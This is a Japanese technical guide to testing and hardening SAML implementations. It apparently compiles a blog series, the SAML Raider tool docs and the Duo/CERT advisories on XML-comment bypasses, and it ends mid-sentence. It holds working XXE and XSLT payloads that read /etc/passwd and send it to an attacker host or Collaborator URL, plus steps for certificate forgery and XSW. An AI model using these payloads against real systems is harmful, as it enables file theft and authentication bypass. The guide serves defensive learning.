これが通る根本原因は、署名検証を「署名要素が存在したら検証する」という条件分岐で実装してしまうこと。署名が無い＝検証すべきものが無い、と解釈して素通しになる。正しくは「署名の**存在を必須**とし、無ければ拒否」でなければならない。

---

### Part III：XXE / XSLT / 証明書偽装 / リプレイ / 受信者混同 / RelayState

> 出典: How to Hunt Bugs in SAML - Part III — https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/

第3部の原記事は、詳細ペイロードを列挙するというより「7ステップの方法論インデックス」＋「RelayState の応用例」＋「チェックリストより創造性が要る」というメッセージに絞られている。以下では各技法の具体を、3部作全体の内容として整理して示す（原記事に明示されないコード例には一般知識に基づく補足である旨を付す）。原記事が掲げる7ステップは次のとおり。

1. Signature Exclusion（署名除外：署名なし Assertion を受理するか）
2. XML Signature Wrapping（XSW：ラッピング耐性）
3. Certificate Faking（証明書偽装：IdP 検証の有無）
4. Assertion Replay（アサーション再送：複数セッション生成の可否）
5. XXE Testing（XML外部実体の露出）
6. XSLT Testing（XSL変換のリスク）
7. Token Recipient Confusion（共有IdP環境でのSP横断受理）

#### 証明書偽装（Certificate Faking）

SP が「信頼する IdP が署名したか」を、証明書の妥当性まで含めて検証しているかを試す。自己署名証明書で署名し直しても通るなら、SP は発行者証明書の検証をしていない。

手順（SAML Raider）：

1. 署名付き SAML Response を傍受する。
2. 「Send Certificate to SAML Raider Certs」で証明書を取り込む。
3. Certificates タブで取り込んだ証明書を選び「Save and Self-Sign」。
4. Proxy タブに戻る。
5. ドロップダウンから自己署名証明書を選ぶ。
6. 「Remove Signatures」。
7. 「(Re-)Sign Message」または「(Re-)Sign Assertion」。
8. 改ざん済み Response を転送する。

成功する原因は、SP が `<ds:KeyInfo>` に添付された証明書を**そのまま信頼して署名検証に使う**（＝「メッセージに同梱された鍵で検証が通ればOK」）実装にある。正しくは、事前に IdP メタデータで固定した証明書（またはそのフィンガープリント）だけを信頼し、メッセージ同梱の証明書は無視すべきだ。同梱の鍵で検証すれば、攻撃者が自作の鍵ペアで署名して自作の証明書を添えるだけで常に「検証成功」になる。

#### アサーション再送（Assertion Replay）

同一の（正規に署名された）Assertion を2回以上送って、複数セッションが張れるかを見る。`InResponseTo` や、`NotOnOrAfter` による使い捨て化、一度使った Assertion ID の記録（ワンタイム保証）が無いと成立する。SP は消費済み Assertion の ID を一定期間キャッシュし、再送を拒否しなければならない。

#### XXE（XML External Entity）注入

SAML Response は「deflate 圧縮 → base64」の XML 文書である。したがって XML 宣言直後に **DOCTYPE / 外部実体宣言**を差し込める。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd">
]>
<samlp:Response ...>
  <!-- 以降は通常のSAML構造 -->
</samlp:Response>
```

なぜ通るのか。SP が Response を処理する際の XMLパーサが**外部実体の解決を有効**にしていると、`&file;` の参照や外部 DTD 取得の時点で、署名検証より前にパーサがファイルを読み、外部 URL を取りに行ってしまう。ポイントは**署名検証の前段でパースが走る**こと。したがって署名が無くても（あるいは XSW を併用しなくても）成立する。

検証（帯域外＝アウトオブバンド）手順：

1. Burp Collaborator の URL を用意する（データ持ち出しの受け皿）。
2. XML 文書冒頭に XXE ペイロードを挿入する。
3. SP へ転送する。
4. Collaborator に DNS 問い合わせや HTTP コールバックが来ないか（おおむね60秒以内）を監視する。

コールバックが来れば XXE 脆弱性が確認できる。`/etc/passwd` の直接反射が返らなくても、外部 DTD を使ったブラインド exfiltration（外部 DTD 内でパラメータ実体を組み立てて Collaborator へ送る手口）で内容を抜ける場合がある点が「なぜ帯域外か」の理由だ。防御は**DTD 処理と外部実体解決の完全無効化**（パーサを FEATURE_SECURE_PROCESSING 等で堅牢化）に尽きる。

#### XSLT インジェクション

XSLT（Extensible Stylesheet Language Transformation：XMLを別形式へ変換する言語）は**チューリング完全**であり、`<ds:Transform>` に変換として XSLT を仕込める。しかも**署名検証の前に Transform が実行される**ため、有効な署名がなくても発火する。これが XSLT 攻撃の核心だ。

ペイロード例：

```xml
<ds:Transform>
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="doc">
      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
      <xsl:variable name="attackerUrl" select="'http://1qsg2yhdfz4np3uerviimk3hk8qyen.burpcollaborator.net/'"/>
      <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
      <xsl:value-of select="unparsed-text($exploitUrl)"/>
    </xsl:template>
  </xsl:stylesheet>
</ds:Transform>
```

このペイロードは、`unparsed-text()` で `/etc/passwd` を読み、`encode-for-uri()` でURLエンコードし、攻撃者の Collaborator URL に連結して、再び `unparsed-text()` でその URL を「取得」することでファイル内容を帯域外送出する。`<ds:Transform>` を格納する `<ds:Transforms>` の位置：

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:Transforms>
    <!-- ここに上記ペイロードを挿入 -->
  </ds:Transforms>
</ds:Signature>
```

なぜ署名前に走るのか。XML 署名の仕様上、ハッシュ計算の対象を作るために「Transform を順に適用してから正規化しダイジェストを取る」段取りになっている。つまり Transform の実行は**ダイジェスト検証の準備工程**であり、検証成否を出す前に完了している。ここに任意 XSLT を差し込めば、署名が正しいかどうかに関係なくコードが走る。防御は、署名検証に使う XSLT/Transform エンジンで危険な拡張関数（`unparsed-text` / `document()` 等の外部アクセス）を無効化するか、そもそもカスタム Transform を禁止することだ。

#### トークン受信者混同（SAML-TRC：Token Recipient Confusion）

`<saml:SubjectConfirmationData>` の **Recipient 属性**（Assertion の意図された配送先）の検証不備を突く。ある SP 宛ての Assertion を、同じ IdP を共有する別 SP に流用できてしまう欠陥だ。

前提条件：

- 攻撃者が **SP-Legit**（攻撃者が正規に持つアカウント）を保有している。
- **SP-Target** が SP-Legit と**同一の IdP** を共有している。
- 両 SP が同じ IdP のトークンを受理する。

攻撃：

1. 共有 IdP 経由で SP-Legit に認証する。
2. SP-Legit 宛ての SAML Response を傍受する。
3. 同じ Response を SP-Target へ転送する。
4. SP-Target が Recipient を検証していなければ、SP-Legit のユーザーとして SP-Target にアクセスできる。

成功すれば、攻撃者の SP-Legit 資格で SP-Target に入れてしまう。根本原因は、SP が「署名が正しい（＝正規 IdP が発行した）」ことだけを確認し、「**この Assertion は本当に自分（この SP）宛てか**」（Recipient / AudienceRestriction / Destination の一致）を確認しないこと。マルチテナントや共有 IdP 環境で特に危険で、SP は必ず自分の ACS URL・エンティティ ID と一致するかを検証しなければならない。

#### RelayState と「チェックリストを超える創造性」

第3部の締めくくりとして epi052 が強調するのは、**RelayState の応用例**だ。RelayState は SP が認証後の遷移先を思い出すために使う値で、SP がこれを検証せずリダイレクト先に使うと**オープンリダイレクト**になり得る（原記事は Rick Osgood のブログを引く）。これは SAML の“コア攻撃面”ではなく周辺パラメータだが、だからこそ見落とされやすい。

原記事のメッセージは明快だ。方法論は**厳格なチェックリストと混同すべきでない**。既存手法に変化を加える創造性こそがバグ発見の鍵であり、RelayState のように「SAML本体ではない付随パラメータ」にも攻撃面は広がっている、という視点で臨むべきだ。

---

### 防御まとめ（この3部作から読み取るべき設計原則）

攻撃の裏返しとして、堅牢な SP 実装が満たすべき要件を整理する。

- **署名の存在を必須化**する。署名が無い Response/Assertion は即拒否（Signature Exclusion 対策）。
- **署名対象と処理対象を一致させる**。「署名済みの要素だけをアプリロジックに渡す」設計にし、`ID` の重複や `Reference URI` と実処理要素の乖離を検出する。スキーマ検証を有効にしつつ、Extensions を悪用する XSW #7/#8 も想定する（XSW 対策）。
- **信頼する証明書を事前固定**する。メッセージ同梱の `<ds:KeyInfo>` 証明書を信頼せず、IdP メタデータで固定した鍵・フィンガープリントでのみ検証する（証明書偽装対策）。
- **Assertion をワンタイム化**する。ID をキャッシュして再送を拒否し、`NotBefore`/`NotOnOrAfter` を厳格に評価する（リプレイ対策）。
- **XMLパーサを堅牢化**する。DTD・外部実体解決を無効化し、カスタム Transform／危険な XSLT 拡張関数を禁止する（XXE / XSLT 対策）。
- **宛先を必ず検証**する。`Recipient`・`AudienceRestriction`・`Destination`・`InResponseTo` を自 SP の値と厳密照合する（受信者混同・未要求 Response 対策）。
- **RelayState を検証**する。リダイレクト先に使う場合は許可リストで制限する（オープンリダイレクト対策）。

これらはいずれも「署名が通った＝安全」という素朴な思い込みを排し、**署名の対象・発行者・宛先・鮮度**を独立に検証するという一点に集約される。SAML の脆弱性の大半は、この4観点のどれかを省いた実装から生まれている。

> 出典（3部作）:
> - Part I — https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
> - Part II — https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/
> - Part III — https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/

## SAML Raiderと署名ラッピング（XSW）

SAMLの署名検証は「XMLパーサがどのノードを検証したか」と「アプリケーションがどのノードを処理に使うか」が食い違うと、致命的な認証バイパスにつながります。この節では、その検証を実務で行うためのBurp Suite拡張「SAML Raider」の機能と、XSW（XML Signature Wrapping、XML署名ラッピング）攻撃の8つのバリエーション（XSW1〜XSW8）の仕組みを、原理レベルで解説します。

### SAML Raiderとは何か

SAML Raiderは、SAML2ベースの認証基盤をテストするために作られたBurp Suite拡張機能です。スイスの技術大学（HSR：現OST）の卒業論文プロジェクトとして、Roland BischofbergerとEmanuel Dudaによって開発されました。MITライセンスで公開されており、Burp Suiteの「BApp Store」から検索してインストールするのが推奨されている方法です。手動でインストールする場合は、リリースされているJARファイル（例: `saml-raider-2.5.2.jar`）をダウンロードし、Burpの拡張機能タブから読み込みます。

> 出典: SAML Raider (Burp拡張) — https://github.com/CompassSecurity/SAMLRaider

SAML Raiderは大きく分けて2つの機能を提供します。

1. **メッセージエディタ（Message Editor）**: BurpでインターセプトしたSAMLメッセージ（`SAMLRequest`パラメータや`SAMLResponse`パラメータ）をデコードして表示・編集し、XSW攻撃やXXE（XML外部エンティティ）、XSLTインジェクションなどのペイロードをワンクリックで挿入できます。POSTバインディング、Redirectバインディング、SOAPバインディング、URIバインディングに対応しており、SAML Webブラウザ SSOプロファイルとWeb Services Security SAML Token Profileの両方を扱えます。
2. **証明書管理（Certificates）**: X.509証明書のインポート・エクスポート（PEM/DER形式）、証明書チェーンの取り込み、秘密鍵（PKCS#8形式やRSA PEM形式）のインポート・エクスポート、そして証明書の**クローン化**や**自己署名**（自分の鍵で新しい証明書を作る）機能を持ちます。

なぜ証明書管理機能が重要かというと、XSW攻撃の中には「攻撃者が自分の署名鍵で偽の署名を付与する」パターンがあり、そのためには検証対象のIdP（Identity Provider、SAMLアサーションを発行する側）証明書を「クローン」して自己署名した偽証明書を用意する必要があるからです。SAML Raiderはこの一連の作業をGUI上で完結させます。

実務上の設定のコツとして、Burpのインターセプトルールに「パラメータ名が`SAMLResponse`を含むリクエストを対象にする」という条件を追加しておくと、SSOフロー中のレスポンスを確実に捕捉できます。カスタムパラメータ名（`SAMLResponse`以外の名前でSAMLメッセージをやり取りする実装）を使う場合は、SAML Raiderの証明書タブ側でパラメータ名を設定できます。また、XXE攻撃を試す際には、XMLの整形（pretty print）によってペイロードが壊れることがあるため、「Raw モード」での編集が推奨されています。

> 出典: SAML Raider (Burp拡張) — https://github.com/CompassSecurity/SAMLRaider

### XSW（XML Signature Wrapping）とは何か：根本原理

XSW攻撃は、XML署名（XML Digital Signature）の検証プロセスと、アプリケーションがビジネスロジックで実際に読み取るデータ構造が「別物」であるというギャップを突く攻撃です。

通常、SAMLレスポンスの処理は次の2ステップに分かれます。

1. **署名検証（Signature Validation）**: XML署名ライブラリが、署名対象として指定された要素（`<ds:Reference URI="#...">`で参照されるID）のダイジェスト（ハッシュ値）を再計算し、格納されている`<ds:SignatureValue>`と照合する。
2. **ビジネスロジック処理（Assertion Processing）**: アプリケーション（Service Provider、以下SP）側のコードが、XMLドキュメントをXPathやDOM APIで走査し、「どこかにある`<saml:Assertion>`」を取り出してユーザー名や属性を読み取る。

この2つのステップが**同じ要素**を対象にしていれば問題はありません。しかし、多くの実装では、ステップ1は「署名が指す`Reference URI`のID」を厳密に見て検証する一方、ステップ2は「ドキュメント中で最初に見つかった、あるいは特定のXPathにマッチする`Assertion`要素」を読み取る、という実装になりがちです。ここに**署名検証の対象**と**処理対象**の不一致が生まれます。

攻撃者はこの不一致を突き、次のようなXMLを作ります。

- 元の（正規にIdPが署名した）`Assertion`はそのままドキュメント内に残す（署名検証はこれを見て「正当」と判定する）。
- その隣、あるいは入れ子構造の中に、攻撃者が改ざんした**署名なしの偽Assertion**を追加する（アプリケーションのビジネスロジックはこちらを読んでしまう）。

XMLパーサとXPathの「兄弟要素・親子要素・同一ID属性の重複」に対する寛容さ（曖昧な扱い）が、この攻撃を成立させる土台になっています。これがXSWの核心原理です。

この攻撃を最初に体系化したのはSomorovskyらによる2012年の研究（"On Breaking SAML: Be Whoever You Want to Be"）で、そこで8種類の典型的なXSWバリエーションが定義されました。SAML Raiderはこの8種類（XSW1〜XSW8）をワンクリックで生成できるテンプレートとして実装しています。

### XSW1〜XSW8：各バリエーションの構造と狙い

以下、SAML Raiderが提供する8種類の代表的なXSWパターンを、DOM構造レベルで説明します。実際のXMLの詳細な属性名は実装により差がありますが、「どこに何を挿入し、署名検証と処理対象がどうズレるか」という構造原理は共通です。

#### XSW1：Response全体を複製して署名の外側に追加

```xml
<samlp:Response ID="original-id" ...>
  <ds:Signature>...署名: original-id を参照...</ds:Signature>
  <saml:Assertion>...正規の（署名対象の）Assertion...</saml:Assertion>
</samlp:Response>

<!-- XSW1が追加する偽Responseは元Responseの兄弟として、
     または元Response配下の末尾に挿入される -->
<samlp:Response ID="evil-id" ...>
  <saml:Assertion>...攻撃者が改ざんしたAssertion（署名なし）...</saml:Assertion>
</samlp:Response>
```

XSW1はResponseメッセージ全体を複製し、正規の署名済みResponseの後ろに、署名を持たない偽Responseを追加します。SPの実装が「ドキュメント内で最後に見つかったResponse（またはAssertion）」を処理に使うタイプの場合、署名検証は元のResponseに対して成功する一方、実際にログインに使われるのは末尾の偽Responseになります。これは最も単純な「パーサがどの要素を拾うか」への依存を突く攻撃です。

#### XSW2：XSW1に近いが、挿入位置・IDの扱いが異なるバリエーション

XSW2はXSW1と似た構造ですが、偽Responseの挿入位置や属性の持たせ方（例えば元のResponseのIDを流用しない、または別の位置関係にする）が異なる亜種です。SPのパース実装によって「最初に見つかった要素を使うか」「最後に見つかった要素を使うか」の挙動が異なるため、XSW1とXSW2はペアで用意され、どちらのパース戦略の実装にも対応できるようにしてあります。

#### XSW3・XSW4：Assertionを入れ子にして「外側」を読ませる

```xml
<saml:Assertion ID="evil-id">          <!-- 署名なしの攻撃者Assertion（外側） -->
  <saml:Subject>attacker@evil.example</saml:Subject>
  <saml:AttributeStatement>...改ざんした属性...</saml:AttributeStatement>

  <saml:Assertion ID="original-id">     <!-- 元の署名済みAssertion（内側） -->
    <ds:Signature>...original-id を参照...</ds:Signature>
    <saml:Subject>victim@example.com</saml:Subject>
  </saml:Assertion>
</saml:Assertion>
```

XSW3・XSW4は、正規の署名済みAssertionを、攻撃者が作った偽Assertionの**内側（子要素）**として埋め込みます。署名検証ライブラリはID参照で`original-id`を見つけ、その部分木のダイジェストを計算するので検証は成功します。しかし、多くのSP実装は「ドキュメントのルート、あるいはXPathで最初にマッチしたAssertion要素」を処理対象にするため、外側の攻撃者Assertion（`evil-id`）の属性が読み取られてしまいます。XSW3とXSW4は、この入れ子構造を`Response`直下に置くか`Assertion`自身の中に置くかなど、挿入位置の違いによる亜種です。

#### XSW5・XSW6：署名そのものを攻撃者の要素に「移設」する

XSW5は一歩進んで、元のAssertionから`<ds:Signature>`要素そのものを取り出し、攻撃者が作った偽Assertionの中に移設します。この状態で、署名の`Reference URI`は元のAssertionのIDを指したままにしておくと、署名ライブラリは「ID参照先の部分木」のダイジェストを計算して検証には成功しますが、SPが実際に読み取る「署名を含んでいる要素」としては攻撃者のAssertionが選ばれてしまう実装があります。これは「署名がどのAssertionに“属している”とSP側のコードが判断するか」というロジックの曖昧さを突くパターンです。

XSW6はXSW5をさらに発展させ、元の署名済みAssertionを、攻撃者Assertionの`<Extensions>`要素（拡張用の任意要素を格納する場所）の中に移動させます。多くのXMLパーサやXPathクエリは`Extensions`要素の中身を「本文とは別の付随情報」として扱うため、ビジネスロジックが誤って外側の攻撃者Assertionを本体として処理してしまう可能性が高まります。

#### XSW7：Extensions要素を悪用した属性追加型

XSW7は、正規の署名済みAssertion自体は変更せず、その`<Extensions>`要素の中に攻撃者の偽データを追加するパターンです。署名対象の範囲設定（署名が`Extensions`要素の中身の変更を検知できるかどうか）が実装によって曖昧な場合、署名検証を壊さずに追加情報を混入させられることがあります。

#### XSW8：Object要素を使ってSOAP/Assertion単体メッセージを狙う

```xml
<saml:Assertion ID="original-id">
  <ds:Signature>
    <ds:SignedInfo>...</ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
    <ds:KeyInfo>...</ds:KeyInfo>
    <ds:Object>
      <!-- ここに元のAssertionのコピー（署名を除去したもの）を格納 -->
      <saml:Assertion ID="evil-id">...改ざんしたコピー...</saml:Assertion>
    </ds:Object>
  </ds:Signature>
  <saml:Subject>victim@example.com</saml:Subject>
</saml:Assertion>
```

XSW8は、Assertion単体（Response全体ではなくAssertionメッセージ単体、例えばWeb Services Security SAML Token ProfileのようなSOAPベースの文脈）を対象にした亜種です。XML署名の`<ds:Object>`要素（署名本体とは別に任意のデータを格納できる場所）の中に、署名を取り除いた偽Assertionのコピーを埋め込みます。SP側の実装が「署名要素の中まで探索してAssertionを拾ってしまう」ような雑なXPathクエリ（例: `//saml:Assertion`のようにドキュメント全体から無条件にマッチさせるクエリ）を使っていると、このObject内の偽データが処理対象として選ばれてしまいます。

> 出典: SAML Raider (Burp拡張) — https://github.com/CompassSecurity/SAMLRaider

### なぜこれが成立するのか：仕組みレベルの整理

XSW攻撃全体に共通する原理は、次の3点に集約できます。

1. **署名検証はID参照（`Reference URI="#id"`）で対象を特定する**。XML文書内に同じ構造や似た要素が複数存在しても、署名検証ライブラリは指定されたIDの部分木さえ見つければ検証を通してしまう。XML仕様上、同一ドキュメント内でIDの一意性が保証されない、あるいはパーサがそれを強制しない実装が存在することが前提になる。
2. **ビジネスロジックはXPathやDOM APIの「最初にマッチした要素」「特定の位置」を素朴に信頼する**。多くの実装は「署名を検証したら、その署名がどの要素にかかっていたかを厳密に追跡する」のではなく、「ドキュメントのどこかにあるAssertion要素を読む」という素朴な実装になりがちである。
3. **署名検証とビジネスロジックが別々のコードパス（多くの場合、別ライブラリ・別処理フェーズ）で動く**。検証結果（真偽値）だけがビジネスロジック側に渡され、「どの具体的なDOMノードを検証したか」という情報が引き継がれないと、検証済みノードと処理対象ノードの同一性を保証できなくなる。

つまりXSWは、暗号アルゴリズム自体の弱点ではなく、**「検証した対象」と「使用した対象」の同一性検証の欠落**という、実装・パーサレベルの設計ミスを突く攻撃です。これは同種の脆弱性がSAML以外（例えばJWTの`kid`ヘッダ改ざんや、XML全般を扱うプロトコル）でも繰り返し現れる典型的なパターンであり、理解しておく価値があります。

### 防御策

- **署名検証後、実際にビジネスロジックで処理する要素が「検証済みの署名が指すノードそのもの」であることを、DOMノードの参照（オブジェクトID）レベルで確認する**。XPathで再検索するのではなく、署名ライブラリが返す「検証済みノードへの参照」をそのまま後続処理に渡す実装にする。
- **ドキュメント内に許可された数以上のSignature要素・Assertion要素・Response要素が存在する場合はエラーとして拒否する**（構造的な異常を検知して弾く）。
- **信頼できるSAMLライブラリ（OpenSAML、Duende、Sustainsys.Samlなど、XSW対策済みとして知られる実装）を使い、自前でXMLをパースして署名検証を行う実装を避ける**。
- 定期的にSAML Raiderなどのツールで自組織のSP実装に対してXSW1〜XSW8のパターンを（許可された検証環境でのみ）試験し、いずれのパターンでも認証バイパスが成立しないことを確認する。

> ⚠️ **未取得の資料**: 「SAML From A Hackers Perspective Part 4 - XSW」（YouTube動画）は、字幕・文字起こしを自動取得できませんでした（理由: YouTubeの動画ページはナビゲーション要素のみが取得され、字幕データやトランスクリプトが取得対象に含まれていないため）。以下のURLからご自身で直接ご覧ください: https://www.youtube.com/watch?v=ALakvKDsZLo
>
> （以下は未取得資料の補足として一般知識に基づく解説です）この動画は2018年9月に公開された、SAMLをハッカー視点で解説する連続シリーズの第4回で、タイトルが示す通りXSW（Signature Wrapping Attacks）をテーマにしています。シリーズの構成（第1回: 導入、第2回: SAMLフローの分析、第3回: アサーションの詳細）から見て、この第4回では前述のXSW1〜XSW8のようなバリエーションを、実際のSAMLレスポンスのXML構造を見せながらデモンストレーションし、Burp SuiteやSAML Raiderのような拡張を使って手を動かして再現する内容であると推測されます。動画の具体的な発言内容や画面上のペイロードの一字一句については、本節の説明はあくまで一般的なXSWの知識に基づくものであり、動画そのものの検証結果ではない点に留意してください。

### まとめ

SAML Raiderは、SAML実装のXSW脆弱性を実務レベルで検証するための代表的なBurp Suite拡張であり、8種類の典型的なラッピングパターン（XSW1〜XSW8）をワンクリックで生成できます。これらの攻撃はいずれも「署名検証の対象」と「アプリケーションが実際に読み取る対象」がズレるという共通の原理に基づいており、防御側は署名ライブラリが返す検証済みノードをそのまま後続処理に使う、構造的な異常（重複するSignature/Assertion/Response要素）を拒否する、といった対策を実装レベルで徹底する必要があります。

## XMLコメント脆弱性（Duo/CERT VU#475445）

2018年2月、Duo Security（現Cisco傘下）のセキュリティ研究チームが、複数のSAML実装に共通する「認証バイパス（authentication bypass）」の脆弱性群を公開した。これは特定の1製品のバグではなく、**SAMLアサーションの署名検証と、そこからの利用者ID抽出が別々のロジックで行われる**という設計上のギャップを突いたもので、python-saml・ruby-saml・omniauth-saml・Shibboleth openSAML C++ など、業界で広く使われるライブラリが横並びで影響を受けた。米CERT/CCはこれを **VU#475445** として整理し、CVE番号を割り当てている。

本節では、なぜ「XMLコメントを1個差し込むだけ」で他人になりすませてしまうのか、その原理を **XML正規化（canonicalization）** と **DOMツリーのテキストノード（text node）** のレベルまで掘り下げて解説する。攻撃自体の再現ではなく、防御側が「自分の実装は安全か」を判断できるようになることが目的である。

---

### 前提：SAMLアサーションと「署名される対象」

まず用語を確認する。

- **SAMLアサーション（assertion）**: 認証結果を表すXML文書。IdP（Identity Provider、例: Okta, ADFS）が発行し、「この人は誰々である」という主張（assertion）を含む。SP（Service Provider、例: Salesforce, 社内アプリ）はこれを受け取って利用者を認証する。
- **NameID**: アサーションの中で「この利用者は誰か」を一意に示す識別子。多くの場合、メールアドレスやユーザー名が入る。SPは最終的にこのNameIDの**文字列**を見て「どのアカウントとしてログインさせるか」を決める。この文字列がなりすましの標的になる。
- **XMLDSIG（XML Digital Signature）**: XML文書の一部（通常はアサーション要素）にデジタル署名を付ける規格。IdPが秘密鍵で署名し、SPが公開鍵で検証することで「この内容はIdPが作ったもので、途中で改ざんされていない」ことを保証する。

重要なのは、XMLDSIGが署名する対象は**生のバイト列そのものではない**という点である。XMLは「意味が同じでも見た目が違う」表現を許す。たとえば以下は人間から見れば違う文字列だが、XMLの意味論としては同一とみなせる。

- 属性の順序が違う（`a="1" b="2"` と `b="2" a="1"`）
- 空白・インデント・改行の入れ方が違う
- 名前空間宣言の書き方が違う

このような「見た目のブレ」を吸収して**一意な正規形（canonical form）**に変換する処理が **XML正規化（canonicalization、略してC14N）** である。XMLDSIGは、署名を計算する前に必ず対象を正規化し、その正規化後のバイト列に対してハッシュ・署名を行う。検証側も同じ正規化を行ってから署名を照合する。こうしないと、途中のプロキシがインデントを1個変えただけで署名が壊れてしまい、実用にならないためである。

> 出典: A Breakdown of the New SAML Authentication Bypass Vulnerability（Okta Developer Blog） — https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability

---

### 核心：C14Nはコメントを「無視」するが、テキスト抽出は「無視しない」

脆弱性の根っこは、**XML正規化の標準アルゴリズムがコメント（`<!-- ... -->`）を除去してしまう**という仕様にある。

XMLDSIGで最も一般的に使われる正規化アルゴリズムは以下の2つである。

- `Canonical XML`（`http://www.w3.org/2001/10/xml-exc-c14n#` など、**コメントを含まない版**）
- `Canonical XML with Comments`（`...#WithComments`、コメントを保持する版）

SAMLの実装で圧倒的に使われるのは**コメントを含まない版**である。つまり署名検証の世界では、コメントは「存在しないもの」として扱われる。

ここに、もう一方の世界——**利用者ID（NameID）を実際に取り出すコード**——が絡む。多くのライブラリはNameIDの中身を取り出すとき、DOM（Document Object Model、XMLをツリー構造として扱うAPI）を使い、「NameID要素の最初のテキストノードの値」あるいは「子ノードを浅く見た結果」を読む実装になっていた。この**2つの世界がコメントの扱いで食い違う**ことが、認証バイパスを生む。

具体例で見る。正規のアサーションではNameIDはこうなっている。

```xml
<saml:NameID>not-an-admin@okta.com</saml:NameID>
```

攻撃者は自分に発行された（＝正規に署名された）アサーションのこの部分に、コメントを1個差し込む。

```xml
<saml:NameID>not-an-<!-- 任意のコメント -->admin@okta.com</saml:NameID>
```

このとき、XMLパーサはNameID要素の子として**3つのノード**を作る。

1. テキストノード: `not-an-`
2. コメントノード: `任意のコメント`
3. テキストノード: `admin@okta.com`

さて、2つの世界の動きを追う。

**署名検証の世界（C14N・コメント除去）**
正規化でコメントノードが消えるため、正規化後のNameIDは `not-an-admin@okta.com` として復元され、これは元の署名対象と完全に一致する。**したがって署名検証は成功する。** 攻撃者は署名鍵を一切持っていないのに、改ざん後の文書が「正規」と判定されてしまう。

**ID抽出の世界（DOMテキスト読み取り）**
脆弱なライブラリは、NameIDのテキストを取るとき「最初のテキストノードだけ」を読む、あるいはコメントを境界として後続テキストを取りこぼす実装だった。結果として抽出されるIDは、コメントの**前**の `not-an-` だけ、あるいはコメントの**後**の `admin@okta.com` だけになる。

Duoの解説はこの「ちぎれ方」を軸に攻撃を説明している。IdPが管理するアドレス空間が `okta.com` のとき、攻撃者は正規アカウント `user@okta.com<!-- -->.evil.com` のようなIDを自分用に登録しておき、コメント挿入によって抽出結果を `user@okta.com` に化けさせる、といった手口が成り立つ。逆にpython-saml（後述）ではコメント**以降が失われる**挙動が問題になった。いずれにせよ、**「署名が守っている文字列」と「アプリが信じる文字列」が食い違う**という一点が本質である。

> 出典: A Breakdown of the New SAML Authentication Bypass Vulnerability（Okta Developer Blog） — https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability

---

### python-saml/Duo Network Gateway の具体的挙動（CVE-2017-11427 / CVE-2018-7340）

Duo Security の **PSA-2017-003** は、自社製品 Duo Network Gateway（DNG）と、それが依存していた OneLogin の **python-saml** ライブラリを対象とした告知である。ここでの挙動は明確で、**「コメントの後ろのテキストが丸ごと失われる」**ものだった。

> 「python-saml パーサは、コメントを含むXML要素の inner text 全体を取り出せず、コメント以降のテキストがすべて失われる（all the text after the comment is lost）」

つまり、次のアサーション

```xml
<saml:NameID>john<!-- -->_doe@example.com</saml:NameID>
```

について、

- **署名検証**: 正規化でコメントが消え `john_doe@example.com` として検証成功。
- **ID抽出**: コメント以降が捨てられ、抽出結果は `john` だけになる。

したがって、正規に `john_doe@example.com`（あるいは `john...` の形の識別子）を持つ攻撃者は、コメントを仕込むことで抽出結果を `john` に短縮し、**別人「john」になりすます**ことができた。Duoの表現では「攻撃者の識別子 `john_doe` を `john` に短縮して、被害者の実際の識別子が `john` である場合にその人物になりすます」というシナリオである。

この攻撃が成立しやすくなる条件として、DNGの2つの**既定設定**が挙げられている。

- **Username Normalization（ユーザー名正規化）が有効**（既定で有効）: メールアドレス形式のIDから正規化処理でユーザー名部分を切り出すため、`john_doe@...` と `john` の突き合わせが起きやすい。
- **メールドメインの強制が未指定**（既定で未指定）: 受理するメールのドメインを固定していないと、短縮後の文字列が別ドメイン扱いにならず、なりすまし対象と一致しやすい。

影響範囲・評価は以下のとおり。

- 影響製品/バージョン: **Duo Network Gateway 1.2.10 より前**
- CVE: **CVE-2017-11427**（python-saml ライブラリ本体）/ **CVE-2018-7340**（Duo Network Gateway 側）
- CVSS v2: **5.1（Medium）**、リモート悪用可、認証は部分的に必要、機密性に影響（認証バイパスが可能）
- 対策: DNG を **1.2.10 以降**へ更新（更新後の python-saml を同梱）

> 出典: Duo Security PSA-2017-003 — https://duo.com/learn/psa/duo-psa-2017-003

---

### 横断的な整理：CERT VU#475445 と影響ライブラリ一覧

米CERT/CCの **VU#475445** は、この問題を単一ライブラリの話ではなく「**XMLのDOMトラバーサル（DOM traversal、ツリーをたどるAPI）と正規化APIが、ノード内のコメントの扱いで食い違う**」という共通の欠陥として位置づけた。要旨は次の一文に凝縮されている。

> 「一部のXML DOMトラバーサルおよび正規化APIは、XMLノード内のコメントの扱いが一貫していない場合がある（may be inconsistent in handling of comments within XML nodes）。」

そのため攻撃者は「**署名を無効化せずにSAMLコンテンツを改変できる**」。CERTが挙げる影響ライブラリとCVEは以下のとおりで、言語・エコシステムを横断していることがわかる（これが「1件のバグ修正では終わらない」理由である）。

| ライブラリ / 製品 | CVE |
|---|---|
| OneLogin python-saml | CVE-2017-11427 |
| OneLogin ruby-saml | CVE-2017-11428 |
| Clever saml2-js | CVE-2017-11429 |
| OmniAuth-SAML | CVE-2017-11430 |
| Shibboleth openSAML C++ | CVE-2018-0489 |
| Wizkunde SAMLBase | CVE-2018-5387 |
| Duo Network Gateway | CVE-2018-7340 |
| Pulse Secure 各製品 | （ベンダ告知参照） |

CERTによる影響評価は最も厳しく、次のとおりである。

